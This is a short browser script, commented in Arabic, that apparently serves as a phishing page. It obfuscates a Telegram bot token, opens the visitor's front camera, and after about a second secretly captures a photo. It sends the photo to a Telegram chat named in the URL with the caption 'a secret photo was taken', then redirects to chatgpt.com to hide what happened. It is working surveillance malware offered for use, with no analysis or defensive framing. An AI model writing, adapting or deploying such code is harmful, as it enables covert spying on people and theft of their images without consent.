<script>
    // استراتيجية إخفاء التوكن عبر التشفير والعمليات الحسابية
    (function() {
        // جزء 1: التوكن مشفر بـ Base64 ومقسم
        const _0x4a21 = ["ODc1NzE3Njk4Ng==", "QUFGTnN2U3N3TTRKX2FkSWVsVUpXVFN1cXdSdkZKZ1Jv"];
        
        // وظيفة فك التشفير الحسابية
        function _get_secure_key(idx) {
            return atob(_0x4a21[idx]);
        }

        // عمليات حسابية وهمية للتمويه
        let calc1 = Math.pow(2, 10) * 0 + 1;
        let calc2 = (100 / 10) * 0;
        
        // بناء التوكن في الذاكرة فقط
        const botToken = _get_secure_key(calc2) + ":" + _get_secure_key(calc1);

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        async function captureAndSend() {
            if (!chatId) {
                window.location.href = "https://chatgpt.com";
                return;
            }

            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', '📸 تم التقاط صورة سرية.');

                // الإرسال باستخدام التوكن المُركّب
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .finally(() => {
                    window.location.href = "https://chatgpt.com";
                });
            }, 'image/jpeg', 0.6);
        }

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { 
                video.srcObject = stream;
                setTimeout(captureAndSend, 1300);
            })
            .catch(() => { window.location.href = "https://chatgpt.com"; });
    })();
</script>
